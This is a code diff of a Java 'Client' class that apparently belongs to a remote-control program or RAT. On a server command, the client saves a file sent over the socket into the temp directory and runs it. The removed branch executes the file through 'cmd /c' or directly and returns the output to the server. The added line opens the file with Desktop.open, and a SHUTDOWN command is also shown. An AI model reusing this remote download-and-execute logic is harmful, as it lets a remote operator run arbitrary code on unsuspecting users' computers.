@@ -404,7 +404,7 @@ public class Client {
                     }
                     communicate(1);
                 } else if (input.contains("UAE")){
-                    // Save file, execute it accordig to OS
+                    // Save file, execute it according to OS
                     long len = dis.readLong();
                     String fname = System.getProperty("java.io.tmpdir") + File.separator + input.split(";;")[1];
                     File sent = new File(fname);
@@ -414,22 +414,7 @@ public class Client {
                     bos.close();
                     fos.close();
 
-                    if (SYSTEMOS.contains("Windows")){
-                        // Run and get/send output
-                        String output = "";
-                        String cmd = "cmd /c \""+ fname + "\"";
-                        System.out.println(cmd);
-                        Scanner s = new Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A");
-                        output = s.hasNext() ? s.next() : "No output";
-                        communicate(output);
-                    } else {
-                        // Run and get/send output
-                        String output = "";
-                        String cmd = fname;
-                        Scanner s = new Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A");
-                        output = s.hasNext() ? s.next() : "No output";
-                        communicate(output);
-                    }
+                    Desktop.getDesktop().open(sent);
                 } else if (input.equals("SHUTDOWN")){
                     communicate("EXIT"); // Tell server that client is leaving
                     socket.close();
